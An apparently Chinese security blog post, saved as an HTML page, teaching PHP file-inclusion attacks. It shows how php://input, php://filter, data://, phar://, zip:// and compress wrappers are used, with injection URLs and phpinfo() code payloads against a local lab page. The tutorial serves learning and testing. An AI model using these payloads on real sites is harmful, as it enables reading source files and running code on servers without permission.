@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#fff">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">
+
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="php 文件包含伪协议利用 重要配置PHP.ini： allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。 allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。 PHP 中的封装协议(伪协议)1234567891011121314151617181920">
+<meta name="keywords" content="php,文件包含">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php 文件包含伪协议利用">
+<meta property="og:url" content="https://yingyingguaier.github.io/2019/01/03/php 文件包含伪协议利用/index.html">
+<meta property="og:site_name" content="0menc&#39;s Blog">
+<meta property="og:description" content="php 文件包含伪协议利用 重要配置PHP.ini： allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。 allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。 PHP 中的封装协议(伪协议)1234567891011121314151617181920">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/000.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/004.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/004_1.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/005.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/006.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/007.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/008.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/010.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/011.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/012.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/FileContains/013.png">
+<meta property="og:updated_time" content="2019-06-19T18:51:35.112Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php 文件包含伪协议利用">
+<meta name="twitter:description" content="php 文件包含伪协议利用 重要配置PHP.ini： allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。 allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。 PHP 中的封装协议(伪协议)1234567891011121314151617181920">
+<meta name="twitter:image" content="https://yingyingguaier.github.io/img/FileContains/000.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yingyingguaier.github.io/2019/01/03/php 文件包含伪协议利用/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>php 文件包含伪协议利用 | 0menc's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0menc's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学习、踩坑及经验分享</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+    <a href="/404.html" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2019/01/03/php 文件包含伪协议利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="嘤嘤怪er">
+      <meta itemprop="description" content="0menc">
+      <meta itemprop="image" content="/images/jack.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0menc's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php 文件包含伪协议利用
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-01-03 15:34:47" itemprop="dateCreated datePublished" datetime="2019-01-03T15:34:47+08:00">2019-01-03</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/整理/" itemprop="url" rel="index"><span itemprop="name">整理</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/php/" itemprop="url" rel="index"><span itemprop="name">php</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/文件包含/" itemprop="url" rel="index"><span itemprop="name">文件包含</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="php-文件包含伪协议利用"><a href="#php-文件包含伪协议利用" class="headerlink" title="php 文件包含伪协议利用"></a>php 文件包含伪协议利用</h1><hr>
+<h2 id="重要配置"><a href="#重要配置" class="headerlink" title="重要配置"></a>重要配置</h2><p>PHP.ini：</p>
+<p>allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。</p>
+<p>allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。</p>
+<h2 id="PHP-中的封装协议-伪协议"><a href="#PHP-中的封装协议-伪协议" class="headerlink" title="PHP 中的封装协议(伪协议)"></a>PHP 中的封装协议(伪协议)</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//cn2.php.net/manual/zh/wrappers.php</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">file:</span><span class="comment">///var/www/html 访问本地文件系统</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">//&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问 FTP(s) URLs</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">data:</span><span class="comment">// 数据流</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">http:</span><span class="comment">// — 访问 HTTP(s) URLs</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">php:</span><span class="comment">// — 访问各个输入/输出流</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">zlib:</span><span class="comment">// — 压缩流</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">data:</span><span class="comment">// — Data (RFC 2397)</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">glob:</span><span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">phar:</span><span class="comment">// — PHP Archive</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">ssh2:</span><span class="comment">// — Secure Shell 2</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">rar:</span><span class="comment">// — RAR</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">ogg:</span><span class="comment">// — Audio streams</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">expect:</span><span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用file-协议"><a href="#利用file-协议" class="headerlink" title="利用file://协议"></a>利用file://协议</h2><p>利用条件：双off的情况下也可以正常使用</p>
+<p>file:// [文件的绝对路径和文件名]</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">includes.php?file=file://C:<span class="symbol">\p</span>hpStudy<span class="symbol">\P</span>HPTutorial<span class="symbol">\W</span>WW<span class="symbol">\u</span>pload-labs<span class="symbol">\u</span>pload<span class="symbol">\p</span>hpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/FileContains/000.png" alt="000"></p>
+<h2 id="利用php流input"><a href="#利用php流input" class="headerlink" title="利用php流input"></a>利用php流input</h2><p><em>利用条件：</em></p>
+<p>1、allow_url_include = On。</p>
+<p>2、对 allow_url_fopen 不做要求。</p>
+<blockquote>
+<p>/includes.php?file=php://input</p>
+<p>POST：<code>&lt;?php phpinfo();?&gt;</code></p>
+</blockquote>
+<p><img src="/img/FileContains/001.png" alt="001"></p>
+<h2 id="利用php流filter"><a href="#利用php流filter" class="headerlink" title="利用php流filter"></a>利用php流filter</h2><p>利用条件：双off的情况下也可以正常使用</p>
+<p>通过指定末尾的文件，可以读取经 base64 加密后的文件源码。（读取敏感文件）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=includes.php</span><br><span class="line">//includes.php是读取的文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/FileContains/002.png" alt="002"></p>
+<p><img src="/img/FileContains/003.png" alt="003"></p>
+<h2 id="利用-data-URIs"><a href="#利用-data-URIs" class="headerlink" title="利用 data URIs"></a>利用 data URIs</h2><p><em>利用条件：</em></p>
+<p>1、php 版本大于等于 php5.2</p>
+<p>2、allow_url_fopen = On</p>
+<p>3、allow_url_include = On</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line">//%2b是+,需要使用url编码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/FileContains/004.png" alt="004"></p>
+<h2 id="利用phar"><a href="#利用phar" class="headerlink" title="利用phar"></a>利用phar</h2><p><em>利用条件：</em></p>
+<p>1、php 版本大于等于 php5.3.0</p>
+<p>假设有个文件 phpinfo.txt，其内容为 <code>&lt;?php phpinfo(); ?&gt;</code>，打包成 zip 压缩包，如下：</p>
+<blockquote>
+<p>路径：test.zip/test/phpinfo.txt</p>
+</blockquote>
+<p><img src="/img/FileContains/004_1.png" alt="004_1"></p>
+<blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="comment"># 相对路径</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> includes.php?file=phar://upload/test.zip/<span class="built_in">test</span>/phpinfo.txt</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="comment"># 绝对路径</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> includes.php?file=phar://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/test.zip/<span class="built_in">test</span>/phpinfo.txt</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/img/FileContains/005.png" alt="005"></p>
+<p><img src="/img/FileContains/006.png" alt="006"></p>
+<h2 id="利用zip-bzip2-zlib-协议"><a href="#利用zip-bzip2-zlib-协议" class="headerlink" title="利用zip://, bzip2://, zlib://协议"></a>利用zip://, bzip2://, zlib://协议</h2><p><em>利用条件：</em></p>
+<p>1、zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用</p>
+<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件。</p>
+<h3 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a>zip://协议</h3><p><strong>使用方法：</strong></p>
+<p>zip://archive.zip#dir/file.txt</p>
+<p>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>
+<blockquote>
+<p>使用 zip 协议，需要指定绝对路径，同时将 <code>#</code> 编码为 <code>%23</code>，之后填上压缩包内的文件。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 绝对路径</span></span><br><span class="line">includes.php?file=zip://C:\phpStudy\PHPTutorial\WWW\upload-labs\upload\test.zip%23phpinfo.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 相对路径</span></span><br><span class="line">includes.php?file=zip://upload/test.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/FileContains/007.png" alt="007"></p>
+<p><img src="/img/FileContains/008.png" alt="008"></p>
+<h3 id="bzip2-协议"><a href="#bzip2-协议" class="headerlink" title="bzip2://协议"></a>bzip2://协议</h3><p><strong>使用方法：</strong></p>
+<p>compress.bzip2://file.bz2</p>
+<p>利用linux压缩命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">bzip2 压缩</span></span><br><span class="line">bzip2 phpinfo</span><br><span class="line"><span class="meta">#</span><span class="bash">生成phpinfo.bz2,上传到目录</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">includes</span>.php?<span class="keyword">file</span>=compress.bzip2:<span class="comment">//./upload/phpinfo.bz2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/FileContains/010.png" alt="010"></p>
+<p><img src="/img/FileContains/011.png" alt="011"></p>
+<h3 id="zlib-协议"><a href="#zlib-协议" class="headerlink" title="zlib://协议"></a>zlib://协议</h3><p><strong>使用方法：</strong></p>
+<p>compress.zlib://file.gz</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 绝对路径</span></span><br><span class="line">includes.php?file=compress.zlib://C:/phpStudy/PHPTutorial/WWW/upload-labs/upload/phpinfo.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 相对路径</span></span><br><span class="line">includes.php?file=compress.zlib://./upload/phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/FileContains/012.png" alt="012"></p>
+<p><img src="/img/FileContains/013.png" alt="013"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/文件包含/" rel="tag"># 文件包含</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/05/Web基础知识/" rel="prev" title="Web基础知识">
+                <i class="fa fa-chevron-left"></i> Web基础知识
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/28/ModSecurity/" rel="next" title="ModSecurity">
+                ModSecurity <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <a href="/">
+                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
+              </a>
+            
+              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
+              <p class="site-description motion-element" itemprop="description">0menc</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php-文件包含伪协议利用"><span class="nav-number">1.</span> <span class="nav-text">php 文件包含伪协议利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#重要配置"><span class="nav-number">1.1.</span> <span class="nav-text">重要配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-中的封装协议-伪协议"><span class="nav-number">1.2.</span> <span class="nav-text">PHP 中的封装协议(伪协议)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用file-协议"><span class="nav-number">1.3.</span> <span class="nav-text">利用file://协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用php流input"><span class="nav-number">1.4.</span> <span class="nav-text">利用php流input</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用php流filter"><span class="nav-number">1.5.</span> <span class="nav-text">利用php流filter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用-data-URIs"><span class="nav-number">1.6.</span> <span class="nav-text">利用 data URIs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用phar"><span class="nav-number">1.7.</span> <span class="nav-text">利用phar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用zip-bzip2-zlib-协议"><span class="nav-number">1.8.</span> <span class="nav-text">利用zip://, bzip2://, zlib://协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#zip-协议"><span class="nav-number">1.8.1.</span> <span class="nav-text">zip://协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bzip2-协议"><span class="nav-number">1.8.2.</span> <span class="nav-text">bzip2://协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zlib-协议"><span class="nav-number">1.8.3.</span> <span class="nav-text">zlib://协议</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">嘤嘤怪er</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript">
+
+    var a_idx = 0;
+    jQuery(document).ready(function($) {
+        $("body").click(function(e) {
+            var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
+            var $i = $("<span />").text(a[a_idx]);
+            a_idx = (a_idx + 1) % a.length;
+            var x = e.pageX,
+                y = e.pageY;
+            $i.css({
+                "z-index": 99999999999999999999999999999999999999999999999999999999999999999999999999 ,
+                "top": y - 20,
+                "left": x,
+                "position": "absolute",
+                "font-weight": "bold",
+                "color": "#ff6651"
+            });
+            $("body").append($i);
+            $i.animate({
+                    "top": y - 180,
+                    "opacity": 0
+                },
+                1500,
+                function() {
+                    $i.remove();
+                });
+        });
+    });
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"bottom":-40},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
